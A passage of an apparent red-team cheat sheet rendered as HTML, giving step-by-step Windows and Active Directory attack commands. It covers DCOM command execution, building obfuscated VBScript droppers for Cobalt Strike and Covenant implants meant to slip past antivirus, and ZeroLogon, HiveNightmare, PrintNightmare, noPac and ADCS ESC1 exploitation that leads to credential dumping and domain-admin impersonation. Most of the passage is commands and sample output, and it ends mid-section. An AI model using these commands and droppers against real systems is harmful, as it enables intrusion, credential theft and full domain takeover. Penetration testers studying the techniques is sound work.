+</span></span><span class=line><span class=cl>PS&gt; $obj.Document.Application.ShellExecute(&#34;cmd.exe&#34;,&#34;/c calc.exe&#34;,&#34;c:\windows\system32&#34;,$null,0)
+</span></span></code></pre></td></tr></table></div></div><a href=#reference><h3 id=reference><span class=hanchor arialabel=Anchor># </span>Reference</h3></a><ul><li><a href=https://dolosgroup.io/blog/remote-access-cheat-sheet rel=noopener>https://dolosgroup.io/blog/remote-access-cheat-sheet</a></li></ul><a href=#generate-vbscript-dropper-apc-process-injection><h1 id=generate-vbscript-dropper-apc-process-injection><span class=hanchor arialabel=Anchor># </span>Generate VBScript dropper (APC process injection)</h1></a><p>Make sure to download
+<a href=https://github.com/med0x2e/GadgetToJScript.git rel=noopener>GadgetToJScript</a> and
+<a href=https://github.com/TheWover/donut.git rel=noopener>Donut</a>.<em>Note:This method probably won&rsquo;t 100% bypass EDR/AV.</em></p><a href=#cobalt-strike-beacon><h3 id=cobalt-strike-beacon><span class=hanchor arialabel=Anchor># </span>Cobalt Strike Beacon</h3></a><p>For cobalt strike, this aggressor script called
+<a href=https://github.com/RCStep/CSSG rel=noopener><strong>ShellCode Generator</strong></a> is very useful to generate shellcode with custom formatting. This cna also helps to obfuscate with XOR or AES method.</p><ol><li><p>Generate shellcode and this is my default configuration
+<img src=https://quartz.jzhao.xyz//src/images/shellcode_generator.png width=auto alt=SG></p></li><li><p>Use
+<a href=https://gist.githubusercontent.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13/raw/238ed3339a458ce0260f98dc18a38fdbed420457/Payload.txt rel=noopener>this</a> script and paste those hex bytes in <code>shellcode</code> variable
+<img src=https://quartz.jzhao.xyz//src/images/b64var.png width=auto alt=b64var></p></li><li><p>Compile with <strong>GadgetToJScript</strong></p></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>GadgetToJScript</span><span class=p>.</span><span class=n>exe</span> <span class=n>-b</span> <span class=n>-w</span> <span class=n>vbs</span> <span class=n>-o</span> <span class=n>beacon</span> <span class=n>-c</span> <span class=p>.\</span><span class=n>real</span><span class=p>.</span><span class=n>cs</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Execute with <code>wscript.exe beacon.cs</code></li></ol><a href=#covenant-grunt><h3 id=covenant-grunt><span class=hanchor arialabel=Anchor># </span>Covenant Grunt</h3></a><p>For covenant, since its already has its built in .NET generator. You can use donut to further obfuscate the assembly/</p><ol><li>Generate <strong>binary</strong> from Covenant</li><li>Obfuscate and convert to byte array with <strong>Donut</strong>. It will then generate into .bin file.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>donut</span><span class=p>.</span><span class=n>exe</span> <span class=o>-f</span> <span class=p>.\</span><span class=n>Grunt</span><span class=p>.</span><span class=n>exe</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Convert .bin file to base64 and save to clipboard</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># save filepath to a variable</span>
+</span></span><span class=line><span class=cl><span class=nv>$filename</span><span class=p>=</span><span class=s1>&#39;&lt;file-path-to&gt;\payload.bin&#39;</span>
+</span></span><span class=line><span class=cl><span class=c># Convert file to base64 and save to clipboard</span>
+</span></span><span class=line><span class=cl><span class=no>[Convert]</span><span class=p>::</span><span class=n>ToBase64String</span><span class=p>(</span><span class=no>[IO.File]</span><span class=p>::</span><span class=n>ReadAllBytes</span><span class=p>(</span><span class=nv>$filename</span><span class=p>)</span> <span class=p>|</span> <span class=n>Clip</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Download
+<a href=https://gist.githubusercontent.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13/raw/238ed3339a458ce0260f98dc18a38fdbed420457/Payload.txt rel=noopener>this</a> script, save as payload.cs (or anythin bcs no one cares) and replace the <code>b64</code> variable with our current clipboard</li><li>Convert payload.cs to vbs with <strong>GadgetToJScript</strong></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>.\</span><span class=n>GadgetToJScript</span><span class=p>.</span><span class=n>exe</span> <span class=n>-b</span> <span class=n>-w</span> <span class=n>vbs</span> <span class=n>-o</span> <span class=n>realtest</span> <span class=n>-c</span> <span class=p>.\</span><span class=n>real</span><span class=p>.</span><span class=n>cs</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=6><li>Execute on remote computer</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>wscript</span><span class=p>.</span><span class=n>exe</span> <span class=p>.\</span><span class=n>realtest</span><span class=p>.</span><span class=n>vbs</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#extra-red-teaming-tools-that-i-know-of-xd><h1 id=extra-red-teaming-tools-that-i-know-of-xd><span class=hanchor arialabel=Anchor># </span>Extra Red Teaming Tools (that i know of xD)</h1></a><ul><li><a href=https://github.com/sevagas/macro_pack rel=noopener>MacroPack</a> - Generate obfuscated Office Macro</li><li><a href=https://github.com/rasta-mouse/ThreatCheck rel=noopener>ThreatCheck</a> - Check for signature based detection, this support AMSI check as well</li><li><a href=https://github.com/fox-it/adconnectdump rel=noopener>ADConnect Dump</a> - Dumps Azure On-Prem ADConnect</li></ul><a href=#low-hanging-fruits><h1 id=low-hanging-fruits><span class=hanchor arialabel=Anchor># </span>Low Hanging Fruits</h1></a><a href=#zerologon><h3 id=zerologon><span class=hanchor arialabel=Anchor># </span>ZeroLogon</h3></a><p>Set the computer account&rsquo;s password to null allowing attackers to perform
+<a rel=noopener class="internal-link broken" data-src=#dcsync>DCSync</a> attack with null authentication</p><ol><li>Run exploit script
+<a href=https://github.com/risksense/zerologon.git rel=noopener>here</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 set_empty_pw.py DC01 10.10.10.10
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Perform DCSync with null auth</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 secretsdump.py -just-dc -no-pass testlab/DC01<span class=se>\$</span>@10.10.10.10
+</span></span></code></pre></td></tr></table></div></div><a href=#hivenightmare><h3 id=hivenightmare><span class=hanchor arialabel=Anchor># </span>HiveNightmare</h3></a><ol><li>Check if system is vulnerable with the following commands</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Check if BUILTIN/Users has read permission
+</span></span><span class=line><span class=cl>icacls C:\Windows\System32\config\SAM
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Check if shadow copy is available
+</span></span><span class=line><span class=cl>vssadmin list shadows
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Dump SYSTEM Hive with mimikatz</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># mimikatz (On remote computer)
+</span></span><span class=line><span class=cl>mimikatz# lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># secretsdump.py (Local)
+</span></span><span class=line><span class=cl>secretsdump.py -sam SAM-file -system SYSTEM-file LOCAL
+</span></span></code></pre></td></tr></table></div></div><p>Note that the above methods is the manual way. This has been implemented in a automated C# code called
+<a href=https://github.com/GossiTheDog/HiveNightmare rel=noopener>HiveNightmare</a>. Once you retrieve admin&rsquo;s ntlm, you can do lots of stuff including
+<a href=https://twitter.com/gentilkiwi/status/1417467063883476992 rel=noopener>changing password</a> or
+<a rel=noopener class="internal-link broken" data-src=#overpass-the-hash-opth>Pass The Hash</a>/PsExec/Evil-Winrm&mldr;</p><a href=#printnightmare><h1 id=printnightmare><span class=hanchor arialabel=Anchor># </span>PrintNightmare</h1></a><p>Abusing printer spooler service (CVE-2021-34527) to load malicious DLL and execute as SYSTEM. Available POCs can be found here</p><table><thead><tr><th>Link</th><th>Authors</th><th>Language</th></tr></thead><tbody><tr><td><a href=https://github.com/cube0x0/CVE-2021-1675 rel=noopener>https://github.com/cube0x0/CVE-2021-1675</a></td><td><a href=https://twitter.com/cube0x0 rel=noopener>@cube0x0</a></td><td>python, c#</td></tr><tr><td><a href=https://github.com/calebstewart/CVE-2021-1675 rel=noopener>https://github.com/calebstewart/CVE-2021-1675</a></td><td><a href=https://twitter.com/calebjstewart rel=noopener>@calebsteward</a></td><td>PowerShell</td></tr></tbody></table><ol><li>Generate <code>msfvenom</code> payload</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msfvenom -p windows/x64/exec CMD=&#34;net.exe localgroup administrators testuser /add&#34; -f dll -o test.dll
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Run these commands <em>(either one)</em></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=c1># Powershell
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>Import</span><span class=o>-</span><span class=n>Module</span><span class=w> </span><span class=p>.</span><span class=err>\</span><span class=n>cve</span><span class=o>-</span><span class=mi>2021</span><span class=o>-</span><span class=mi>1675</span><span class=p>.</span><span class=n>ps1</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Invoke</span><span class=o>-</span><span class=n>Nightmare</span><span class=w> </span><span class=o>-</span><span class=n>DLL</span><span class=w> </span><span class=s2>&#34;C:\absolute\path\to\your\bindshell.dll&#34;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1># SharpPrintNightMare
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>SharpPrintNightmare</span><span class=p>.</span><span class=n>exe</span><span class=w> </span><span class=n>C</span><span class=p>:</span><span class=err>\</span><span class=n>Windows</span><span class=err>\</span><span class=n>Tasks</span><span class=err>\</span><span class=n>execme</span><span class=p>.</span><span class=n>dll</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1># Python Impacket Implementation
+</span></span></span><span class=line><span class=cl><span class=c1>## setup smbserver
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>smbserver</span><span class=p>.</span><span class=n>py</span><span class=w> </span><span class=n>smbshare</span><span class=w> </span><span class=o>`</span><span class=n>pwd</span><span class=o>`</span><span class=w> </span><span class=o>-</span><span class=n>smb2support</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>python3</span><span class=w> </span><span class=n>CVE</span><span class=o>-</span><span class=mi>2021</span><span class=o>-</span><span class=mi>1675</span><span class=p>.</span><span class=n>py</span><span class=w> </span><span class=n>testlab</span><span class=o>/</span><span class=n>testuser</span><span class=p>:</span><span class=s1>&#39;P@$$w0rd!&#39;</span><span class=o>@</span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=w> </span><span class=s1>&#39;\\10.10.10.10\smbshare\encme.dll&#39;</span><span class=w> </span><span class=p>[</span><span class=o>-</span><span class=n>hashes</span><span class=w> </span><span class=p>:</span><span class=n>NTLM</span><span class=p>]</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><a href=#nopac><h1 id=nopac><span class=hanchor arialabel=Anchor># </span>noPac</h1></a><p>This exploit will require a valid domain user regardless the level of privilege given as long as it can create a computer account on the domain. Here are the steps.</p><ol><li>Create a fake computer with
+<a href=https://github.com/Kevin-Robertson/Powermad rel=noopener>Powermad.ps1</a> script.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>New-MachineAccount -MachineAccount &#34;FakeComputer&#34; -Password $password -Domain legitcorp.local -DomainController DC01.legitcorp.local -Verbose
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Clear the fake computer&rsquo;s ServicePrincipalName (SPN) value</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Set-DomainObject &#34;CN=FakeComputer,CN=Computers,DC=legitcorp,DC=local&#34; -Clear &#34;serviceprincipalname&#34; -Verbose -Domain legitcorp.local
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Rename the fake computer samaccountname to domain controller name (FakeComputer$ -> DC01)</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Set-MachineAccountAttribute -MachineAccount &#34;FakeComputer&#34; -Value &#34;DC01&#34; -Attribute samaccountname -Domain legitcorp.local -Verbose
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Request a TGT of the domain controller</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Rubeus.exe asktgt /user:DC01 /password:Password2 /domain:legitcorp.local /dc:DC01.legitcorp.local /nowrap
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>Rename the fake computer name to its original name (DC01 -> FakeComputer$)</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Set-MachineAccountAttribute -MachineAccount &#34;FakeComputer&#34; -Value &#34;FakeComputer&#34; -Attribute samaccountname -Verbose -Domain legitcorp.local
+</span></span></code></pre></td></tr></table></div></div><ol start=6><li>Request TGS on behalf of the domain controller ticket we obtained previously.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Rubeus.exe s4u /impersonateuser:DC01$ /nowrap /dc:DC01.legitcorp.local /self /altservice:ldap/DC01.legitcorp.local /ptt /ticket:&lt;base64-blob-ticket&gt;
+</span></span></code></pre></td></tr></table></div></div><ol start=7><li>Perform cleanup (OPSEC Friendly)</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Remove-MachineAccount -Domain legitcorp.local -MachineAccount FakeComputer
+</span></span></code></pre></td></tr></table></div></div><a href=#automated-exploit><h3 id=automated-exploit><span class=hanchor arialabel=Anchor># </span>Automated Exploit</h3></a><p>There are a few automated scripts and tools out there to perform this exploit. This are some of the tools that i use previously on an engagement.</p><ul><li>Python (
+<a href=https://github.com/Ridter/noPac.git rel=noopener>https://github.com/Ridter/noPac.git</a>)</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3.exe .\noPac.py domain.local/lowpriv:Passw0rd -dc-ip 10.0.10.10 -dc-host DC01 --impersonate administrator -dump
+</span></span></code></pre></td></tr></table></div></div><ul><li>CSharp (
+<a href=https://github.com/cube0x0/noPac.git rel=noopener>https://github.com/cube0x0/noPac.git</a>)</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>noPac.exe -domain domain.local -user low_priv -pass &#39;P@ssw0rd&#39; /dc dc01.domain.local /mAccount FakeComputer /service [ldap,cifs,http] /ptt
+</span></span></code></pre></td></tr></table></div></div><p>Note: <em>Always perform cleanup if you are exploiting this against the corporate environment. You can use the following command to verify and remove a computer account</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># verify computer account with wmic
+</span></span><span class=line><span class=cl>wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># remove a computer account
+</span></span><span class=line><span class=cl>net computer \\FakeComputer /delete
+</span></span></code></pre></td></tr></table></div></div><a href=#reference-1><h3 id=reference-1><span class=hanchor arialabel=Anchor># </span>Reference</h3></a><p><a href=https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing rel=noopener>https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing</a></p><a href=#adcs><h1 id=adcs><span class=hanchor arialabel=Anchor># </span>ADCS</h1></a><a href=#pki-abuse><h3 id=pki-abuse><span class=hanchor arialabel=Anchor># </span>PKI Abuse</h3></a><p>It is recommended to use below commands with <code>-k</code> option and .cacche file. Please refer
+<a rel=noopener class="internal-link broken" data-src=#request-tgt>Request TGT</a> section</p><ol><li>Enumerate CA(s) on the domain</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 certi.py list &#39;&lt;domain&gt;/&lt;username&gt;&#39; -k -n --dc-ip &lt;dc-ip&gt; --class ca
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Enumerate for vulnerable templates</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Windows
+</span></span><span class=line><span class=cl>Certify.exe find /clientauth
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Linux
+</span></span><span class=line><span class=cl>python3 certi.py list &#39;&lt;domain&gt;/&lt;username&gt;&#39; -k -n --dc-ip &lt;dc-ip&gt; --vuln --enable
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Request cert from CA</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Windows
+</span></span><span class=line><span class=cl>Certify.exe request /ca:dc.legitcorp.local\CA01 /template:vuln-template
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Linux
+</span></span><span class=line><span class=cl>python3 certi.py req &#39;&lt;domain&gt;/&lt;username&gt;@&lt;ca-server&gt;&#39; &lt;ca-service-name&gt; -k -n --dc-ip &lt;dc-ip&gt; --template &lt;vuln-template&gt; --alt-name &lt;target-domain-account&gt;
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Retrieve TGT by using the certificate</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Windows
+</span></span><span class=line><span class=cl>Rubeus.exe asktgt /user:lowpriv /certificate:cert.pfc /password:P@$$w0rd
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Linux
+</span></span><span class=line><span class=cl>python3 gettgtpkinit.py &lt;domain&gt;/&lt;username&gt; -cert-pfx &lt;pfx-certificate-file&gt; -pfx-pass &lt;certificate-password&gt; admin_tgt.ccache   
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>Retrieve NTLM hash (optional)
+At this point, you can either use environment variable <code>KRB5CCNAME</code> to be used with ccache file or you can either get ntlm hash from the ticket with the following Commands</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 getnthash.py -key &lt;AS-REP-encryption-key&gt; -dc-ip &lt;dc-ip&gt; &lt;domain&gt;/&lt;username&gt; output_tgt.ccache
+</span></span></code></pre></td></tr></table></div></div><p>For detailed example, you may refer to this awesome
+<a rel=noopener class="internal-link broken" data-src=#ZgotmplZ>gist</a> by
+<a rel=noopener class="internal-link broken" data-src=#ZgotmplZ>@Flangvik</a></p><a href=#esc1><h3 id=esc1><span class=hanchor arialabel=Anchor># </span>ESC1</h3></a><p>What makes a template vulnerable to ESC1 is when the following requirements are met:</p><table><thead><tr><th>Attributes</th><th>Value</th></tr></thead><tbody><tr><td><code>msPKI-Certificate-Name-Flag</code></td><td><code>(0x1) ENROLLEE_SUPPLIES_SUBJECT</code></td></tr><tr><td><code>pKIExtendedKeyUsage</code></td><td>Client Authentication</td></tr><tr><td><code>msPKI-Certificate-Application-Policy</code></td><td>Client Authentication</td></tr><tr><td>Enrollment Rights</td><td>Domain Users</td></tr></tbody></table><p><em>Note that you would require one valid user to enroll the certificate</em></p><ol><li>List for available vulnerable templates using
+<a href=https://github.com/eloypgz/certi rel=noopener>certi</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 certi.py list range.net/peter:&#39;Welcome1234&#39; --dc-ip 10.8.0.2 --vuln --enabled
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># output should normally be like this
+</span></span><span class=line><span class=cl>Name: VulnUser
+</span></span><span class=line><span class=cl>Schema Version: 2
+</span></span><span class=line><span class=cl>Enroll Services: range-CA01-CA
+</span></span><span class=line><span class=cl>Vulnerabilities: ESC1 - SAN Impersonation
+</span></span><span class=line><span class=cl>msPKI-Certificate-Name-Flag: (0x1) ENROLLEE_SUPPLIES_SUBJECT
+</span></span><span class=line><span class=cl>msPKI-Enrollment-Flag: (0x9) INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+</span></span><span class=line><span class=cl>msPKI-RA-Signature: 0
+</span></span><span class=line><span class=cl>pKIExtendedKeyUsage: Client Authentication, Secure Email, Encrypting File System
+</span></span><span class=line><span class=cl>msPKI-Certificate-Application-Policy: Client Authentication, Secure Email, Encrypting File System
+</span></span><span class=line><span class=cl>SD Owner: S-1-5-21-3556610642-5733621-2059236447-500 range\Administrator
+</span></span><span class=line><span class=cl>Permissions
+</span></span><span class=line><span class=cl>  Enrollment Permissions
+</span></span><span class=line><span class=cl>    Enrollment Rights
+</span></span><span class=line><span class=cl>      S-1-5-21-3556610642-5733621-2059236447-512 range\Domain Admins
+</span></span><span class=line><span class=cl>      S-1-5-21-3556610642-5733621-2059236447-513 range\Domain Users
+</span></span><span class=line><span class=cl>      S-1-5-21-3556610642-5733621-2059236447-519 range\Enterprise Admins
+</span></span><span class=line><span class=cl>[[..snip..]]
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>If requirements are met, then request the certificate using certi by specifying alternate name that include a high privileged user (ie Domain Admins)</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 certi.py req range.net/peter:&#39;Welcome1234&#39;@CA01.range.net range-CA01-CA -k -n --template &#39;VulnUser&#39; --alt-name &#39;rangeadm&#39;
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>A pfx certificate should now be retrieved. Run the following command to request tgt by using the ceritifcate by using
+<a href=/ rel=noopener class=internal-link data-src=/>gettgtpkinit.py</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 gettgtpkinit.py range.net/rangeadm -cert-pfx /opt/certi/rangeadm@range.net.pfx -pfx-pass &#39;admin&#39; -dc-ip 10.8.0.2 /tmp/rangeadm.ccache
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Now a ccache file should now be retrieved. Export the ccache file into <code>KRB5CCNAME</code> environment variable and
+<a rel=noopener class="internal-link broken" data-src=#dcsync>DCSync</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>secretsdump.py range.net/rangeadm@10.8.0.2 -k -no-pass -just-dc -just-dc-user &#39;range\krbtgt&#39;
+</span></span></code></pre></td></tr></table></div></div><p><em>Note that you could also recover ntlm has with getnthash.py script</em></p><a href=#esc4><h3 id=esc4><span class=hanchor arialabel=Anchor># </span>ESC4</h3></a><p>This attack is possible when a low-privileged user has <em>Write Property</em> or any other rights to modify template configuration to allow
+<a rel=noopener class="internal-link broken" data-src=#esc1>ESC1</a> attack to work.
+<a href=https://github.com/fortalice/modifyCertTemplate rel=noopener>modifyCertTemplate.py</a> will be used in the following steps</p><ol><li>Verify the vulnerable template with
+<a href=/ rel=noopener class=internal-link data-src=/>certi</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
